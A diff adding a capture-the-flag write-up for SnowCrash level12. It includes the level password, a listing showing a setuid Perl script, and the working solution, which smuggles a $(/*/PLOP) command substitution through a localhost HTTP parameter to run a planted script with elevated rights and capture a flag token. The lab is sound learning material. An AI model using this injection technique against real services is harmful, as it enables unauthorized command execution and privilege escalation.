@@ -1,0 +1,21 @@
+login level12
+pass fa6v5ateaw21peobuub8ipe6s
+
+ls -la
+-r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout
+-r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc
+-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
+-r-x------  1 level12 level12  675 Apr  3  2012 .profile
+
+when the level12 program is executed, we have the rights of flag12, 
+so we will try to exploit a vulnerability of level12, to make it execute getflag
+
+this perl code performs the following operations on parameter1: 
+shift to uppercase, remove everything after a space
+
+level12@SnowCrash:~$ echo 'echo "$(getflag)" > /tmp/res12' > /tmp/PLOP
+level12@SnowCrash:~$ chmod +x /tmp/PLOP
+level12@SnowCrash:~$ curl 'localhost:4646/?x=$(/*/PLOP)'
+..level12@SnowCrash:~$ cat /tmp/res12
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+
